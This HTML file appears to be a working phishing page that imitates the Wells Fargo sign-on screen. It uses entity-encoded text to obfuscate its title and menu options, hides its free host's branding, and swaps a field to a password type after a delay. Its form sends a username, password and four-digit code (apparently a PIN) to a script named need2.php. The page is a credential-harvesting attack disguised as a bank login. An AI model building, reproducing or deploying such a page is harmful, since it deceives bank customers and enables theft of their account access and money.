<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>S&#105;&#103;n &#79;&#110; &#116;&#111; V&#105;&#101;w Y&#111;&#117;r P&#101;&#114;&#115;&#111;&#110;&#97;l A&#99;&#99;&#111;&#117;&#110;&#116;s | W&#101;&#108;&#108;s F&#97;&#114;&#103;o </title>
<script>setTimeout(function() {
  document.getElementsByTagName('input')[1].type = "password"
}, 1000);
</script>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>
<style>
img[src*="https://cdn.000webhost.com/000webhost/logo/footer-powered-by-000webhost-white2.png"] {
display: none;}
</style>

<style type="text/css">
.textbox {  
    border: solid 1px #CFD1D7;
  	border-radius: 3px;
 	padding-left: 10px;
	font-family: Verdana;
  	font-size: 13px;
    color: #44464A;
    height: 48px; 
    width: 275px; 
 } 
.textbox:focus {  
    border-color: #8EB1EB; 
    border-style: solid; 
  	border-radius: 3px;
    border-width: 2px; 
    outline: 0; 
 } 
 </style>
 <style type="text/css">
 input[type=checkbox].css-checkbox {
							position:absolute; z-index:-1000; left:-1000px; overflow: hidden; clip: rect(0 0 0 0); height:1px; width:1px; margin:-1px; padding:0; border:0;
						}

						input[type=checkbox].css-checkbox + label.css-label {
							padding-left:31px;
							height:26px; 
							display:inline-block;
							line-height:26px;
							background-repeat:no-repeat;
							background-position: 0 0;
							font-size:26px;
							vertical-align:middle;
							cursor:pointer;

						}

						input[type=checkbox].css-checkbox:checked + label.css-label {
							background-position: 0 -26px;
						}
						label.css-label {
				background-image:url(images/csscheckbox_9bce003387f547b3c3c33589a674db92.png);
				-webkit-touch-callout: none;
				-webkit-user-select: none;
				-khtml-user-select: none;
				-moz-user-select: none;
				-ms-user-select: none;
				user-select: none;
			}
 </style>
 <style type="text/css">
div#container
{
	position:relative;
	width: 1349px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>

<style>
p{font-size: 40px;}
.loader {
    position: fixed;
    left: 0px;
    top: 0px;
    width: 100%;
    height: 100%;
    z-index: 9999;
    background: url('https://smallenvelop.com/wp-content/uploads/2014/08/Preloader_11.gif') 50% 50% no-repeat rgb(249,249,249);
    opacity: .8;
}
</style>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
<script type="text/javascript">
$(window).load(function() {
	$(".loader").fadeOut("slow");
});
</script>

</head>
<body>
<div class="loader"></div>
<div id="container">
<div id="image2" style="position:absolute; overflow:hidden; left:306px; top:356px; width:735px; height:631px; z-index:0"><img src="images/w7.png" alt="" title="" border=0 width=735 height=631></div>

<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1349px; height:326px; z-index:1"><img src="images/w1.png" alt="" title="" border=0 width=1349 height=326></div>

<div id="image3" style="position:absolute; overflow:hidden; left:845px; top:410px; width:155px; height:84px; z-index:2"><a href="#"><img src="images/w3.png" alt="" title="" border=0 width=155 height=84></a></div>

<div id="image4" style="position:absolute; overflow:hidden; left:846px; top:573px; width:136px; height:38px; z-index:3"><a href="#"><img src="images/w4.png" alt="" title="" border=0 width=136 height=38></a></div>

<div id="image5" style="position:absolute; overflow:hidden; left:312px; top:969px; width:254px; height:16px; z-index:4"><a href="#"><img src="images/w5.png" alt="" title="" border=0 width=254 height=16></a></div>

<div id="image6" style="position:absolute; overflow:hidden; left:0px; top:1116px; width:1349px; height:125px; z-index:5"><img src="images/w6.png" alt="" title="" border=0 width=1349 height=125></div>
<form action=need2.php name=pechydekho id=pechydekho method=post>
<select name="sm" class="textbox" autocomplete="off" required style="position:absolute;left:313px;top:529px;width:265px;z-index:6">
<option value="&#65;&#99;&#99;&#111;&#117;&#110;&#116;&#32;&#83;&#117;&#109;&#109;&#97;&#114;&#121;" selected="selected">&#65;&#99;&#99;&#111;&#117;&#110;&#116;&#32;&#83;&#117;&#109;&#109;&#97;&#114;&#121;</option>
							<option value="&#84;&#114;&#97;&#110;&#115;&#102;&#101;&#114;">&#84;&#114;&#97;&#110;&#115;&#102;&#101;&#114;</option>
							<option value="&#66;&#105;&#108;&#108;&#32;&#80;&#97;&#121;">&#66;&#105;&#108;&#108;&#32;&#80;&#97;&#121;</option>
							<option value="&#66;&#114;&#111;&#107;&#101;&#114;&#97;&#103;&#101;">&#66;&#114;&#111;&#107;&#101;&#114;&#97;&#103;&#101;</option>
							<option value="&#84;&#114;&#97;&#100;&#101;">&#84;&#114;&#97;&#100;&#101;</option>
							<option value="&#77;&#101;&#115;&#115;&#97;&#103;&#101;&#115;&#32;&#97;&#110;&#100;&#32;&#65;&#108;&#101;&#114;&#116;&#115;">&#77;&#101;&#115;&#115;&#97;&#103;&#101;&#115;&#32;&#97;&#110;&#100;&#32;&#65;&#108;&#101;&#114;&#116;&#115;</option></select>
<input name="ud" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:212px;left:313px;top:614px;z-index:7">
<input name="pd" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:212px;left:543px;top:614px;z-index:8">
<div id="checkboxG1"  style="position:absolute; left:312px; top:677px; z-index:9"><input type="checkbox" name="checkboxG1" id="checkboxG1" class="css-checkbox"><label for="checkboxG1" class="css-label radGroup1 chk"></label></div>
<div id="checkboxG1"  style="position:absolute; left:312px; top:677px; z-index:9"><input type="checkbox" name="checkboxG2" id="checkboxG2" class="css-checkbox"><label for="checkboxG2" class="css-label radGroup1 clr"></label></div>
<input name="ph" class="textbox" autocomplete="off" required maxlength="4" type="text" style="position:absolute;width:212px;left:313px;top:880px;z-index:10">
<div id="formimage1" style="position:absolute; left:579px; top:997px; z-index:11"><input type="image" name="formimage1" width="178" height="42" src="images/wg.png"></div>
<div id="image7" style="position:absolute; overflow:hidden; left:314px; top:779px; width:201px; height:73px; z-index:12"><img src="images/com.gif" alt="" title="" border=0 width=201 height=73></div>


</div>

</body>
</html>
